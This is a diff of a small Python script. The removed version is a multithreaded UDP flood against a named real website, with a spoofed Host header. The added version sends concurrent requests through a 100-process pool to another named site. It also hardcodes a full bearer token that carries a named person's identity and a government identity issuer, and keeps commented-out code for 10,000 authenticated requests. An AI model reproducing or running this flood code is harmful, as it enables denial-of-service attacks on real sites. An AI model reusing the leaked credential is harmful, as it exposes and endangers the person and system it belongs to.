@@ -1,32 +1,31 @@
-import socket
-import threading
-import random
-target = 'programmer.uz'
-fake_ip = 'click-bonus.netlify.app'
-target = socket.gethostbyname(target)
-fake_ip = socket.gethostbyname(fake_ip)
-# port = 443
-attack_num = 0
+import datetime
+
+import requests
+import multiprocessing
+access_token = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI1WWk3LUxmbGNXU3FHazJueEFWWVlXWFZiZ0FBYWNIc3lZTDhWeEJjWU9zIn0.eyJqdGkiOiIzOGNhMDY2ZS1hZTkzLTQ4ODEtYjVkMC1mYWI1NjFjMjRiMmYiLCJleHAiOjE2ODA0OTk5MDIsIm5iZiI6MCwiaWF0IjoxNjc3OTI2NjA1LCJpc3MiOiJodHRwczovL2lkLnByb2t1cmF0dXJhLnV6L2F1dGgvcmVhbG1zL3Byb2t1cmF0dXJhIiwiYXVkIjpbInByb2t1cmF0dXJhLWthZHItdWktYWxwaGEiLCJwcm9rdXJhdHVyYS1rYWRyLWFwaS1kZXYiLCJwcm9rdXJhdHVyYS1rYWRyLXVpIiwicHJva3VyYXR1cmEta2Fkci11aS1kZXYiLCJhY2NvdW50Il0sInN1YiI6ImY3ODlkNGZkLWYxZjgtNGQxZS1hNjgyLWExMDBlYWVmZTIyZiIsInR5cCI6IkJlYXJlciIsImF6cCI6InByb2t1cm9yLW5hem9yYXRpLXVpIiwibm9uY2UiOiI0NDJjOGE4Mi00MzdiLTQ2MWMtOTg0Yy0xNDgwYzA2NDQ2NDQiLCJhdXRoX3RpbWUiOjAsInNlc3Npb25fc3RhdGUiOiI0NzFiMGZjNC0xYzYzLTQ0YjMtOTdhZC05OWJkYWI3YTZlYjAiLCJhY3IiOiIwIiwiYWxsb3dlZC1vcmlnaW5zIjpbImh0dHA6Ly9sb2NhbGhvc3Q6ODA4MCIsImh0dHBzOi8vbmF6b3JhdC5wcm9rdXJhdHVyYS51eiIsImh0dHA6Ly9mYWNlaWQucHJva3VyYXR1cmEudXoiLCJodHRwczovL2ZhY2VpZC5wcm9rdXJhdHVyYS51eiJdLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsib2ZmbGluZV9hY2Nlc3MiLCJ1bWFfYXV0aG9yaXphdGlvbiJdfSwicmVzb3VyY2VfYWNjZXNzIjp7InByb2t1cmF0dXJhLWthZHItdWktYWxwaGEiOnsicm9sZXMiOlsidXNlciJdfSwicHJva3VyYXR1cmEta2Fkci1hcGktZGV2Ijp7InJvbGVzIjpbInVzZXIiXX0sInByb2t1cmF0dXJhLWthZHItdWkiOnsicm9sZXMiOlsidXNlciJdfSwicHJva3VyYXR1cmEta2Fkci11aS1kZXYiOnsicm9sZXMiOlsidXNlciJdfSwiYWNjb3VudCI6eyJyb2xlcyI6WyJtYW5hZ2UtYWNjb3VudCIsIm1hbmFnZS1hY2NvdW50LWxpbmtzIiwidmlldy1wcm9maWxlIl19fSwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwibmFtZSI6Ik9kaWxqb24gR-KAmGF5YnVsbGF5ZXYiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJvLm4uZ2F5YnVsbGF5ZXYiLCJnaXZlbl9uYW1lIjoiT2RpbGpvbiIsImZhbWlseV9uYW1lIjoiR-KAmGF5YnVsbGF5ZXYifQ.X2NHBr1O7x3kRM_IavPwS8Xn-qBoydUALGfOuPtXrz74BfNESV0JrXg7_gkKZTTtQAK0O0E2TQdx4bf5_2lnZHtUn38LoeKCt-chWQPi_9uv8ZTpk7qVw_cimPF5MIYtZ4-vOJMgDmefI1NAoqG9ezK0N7e-yow0bKrQ8a5gcSulovL0Dbes6KXEcL9-2KtmgKk-4h-si6lnq1z3B0_Ct7w_3OF59wZo3BUJTUnVS4FZezKIsd1V-vULz5eksgdL-R1OJDrLNXqxd2xETCd99obI_ExIqPnt_jXQvnJXFhRQJ3R1LcaWkfDbY49AiQ8Gz6y2WpyKZQNqoIrZeXPYyA"
+
+url = 'http://complexprogrammer.uz/'
+url2 = 'http://complexprogrammer.uz/avtotest/'
+urls = [url, url2] * 100
+# headers = {"Authorization": f"Bearer {access_token}"}
+# for i in range(10000):
+#     response = requests.get(url, headers=headers)
+#     decoded_response = response.content.decode('utf-8', errors='ignore')
+#     print(f'Response {i + 1}: {decoded_response}')
 
 
-def attack():
-    try:
-        while True:
-            Byte = random._urandom(1024)
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            port = random.randint(22, 55500)
-            print("port  "+port.__str__())
-            s.connect((target, port))
-            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-            global attack_num
-            attack_num += 1
-            print(attack_num)
-            s.close()
-    except Exception as Error:
-        print(Error)
+def send_request(url):
+    # response = requests.get(url, headers=headers)
+    response = requests.get(url)
+    decoded_response = response.content.decode('utf-8', errors='ignore')
+    # print(f'{decoded_response}')
+    return decoded_response
 
 
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
+if __name__ == '__main__':
+    pool = multiprocessing.Pool(processes=100)
+    results = pool.map(send_request, urls)
+    print(results)
+
+
+print("tugadi :)")
